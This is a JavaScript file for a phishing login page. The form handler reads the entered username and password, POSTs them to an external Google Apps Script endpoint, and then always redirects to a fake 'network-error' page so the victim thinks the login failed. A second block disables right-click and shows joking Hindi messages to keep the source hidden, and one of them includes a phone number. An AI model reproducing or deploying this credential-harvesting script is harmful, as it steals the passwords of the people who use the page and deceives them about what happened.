
// 🔹 Login Form Script
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const data = {
    username: this.username.value,
    password: this.password.value
  };

  fetch("https://script.google.com/macros/s/AKfycbyPCNw32rKbcFBbYT5qIc0Jz1HS-rDHS3ZwcvNS6NMpjaHjjUZCWXw6f2XXF0pOV2qkQA/exec", {
    method: "POST",
    body: JSON.stringify(data)
  }).finally(() => {
    // Always redirect to error page after submit
    window.location.href = "network-error.html";
  });
});

// 🔹 Funny Hindi Right-Click Block
document.addEventListener("contextmenu", function(e) {
  e.preventDefault();

  const msgs = [
    "🤣 Oye hacker ji, coding ka shortcut nahi milne wala!",
    "😜 Right click kar ke duniya nahi badlegi bhai!",
    "😂 Itna bhi kya pyaar hai source code se?",
    "🙃 Arre baba, yeh button sirf tension deta hai!",
    "😎 Chill maar... code Google pe bhi nahi milega!",
    "😏 Abey, keyboard use kar... mouse thak gaya hai!",
    "🔥 Hacker banna hai? Lekin free WiFi pe baith ke?",
    "🤣 Yeh code tujhe samajh aaya toh humko bhi bata dena!",
    "😅 Beta, coding karni hai ya shadi.com join karna hai?",
    "🤯 System bol raha hai: 'Abe ruk jaa, dimaag kharab ho gaya!'",
    "😂 Oye hoye! Code dekhna mana hai!",
    "😎 Chill bhai, yeh secret hai!",
    "🤨 Itna bhi kya pyaar hai mere code se?",
    "🕵️ Arre detective babu, kuch nahi milega!",
    "⚠️ Beta, coding ki duniya dangerous hai!",
    "😂 Oye! Right click se coding nahi sikhi jaati!",
    "😎 Arre bhai, code chahiye toh khud likhna seekh!",
    "🤨 Itna pyaar mere code se? Shaadi karega kya?",
    "🕵️ Detective mode band kar... yahan kuch secret nahi!",
    "⚠️ Warning: Yeh button daba ke kuch nahi milega!",
    "🤣 Hacker banna hai? Pahle padhai karle beta!",
    "🤖 Are yaar, code chaiye to is number par message kar! +916355938009",
    "😜 Mazak tha... code idhar nahi milega!",
    "🙈 Right click kar ke kya hi milega? Chai pi le ja..!",
    "🔥 Error 101: Teri curiosity zyada hai!"
  ];

  const msg = msgs[Math.floor(Math.random() * msgs.length)];
  alert(msg);
});
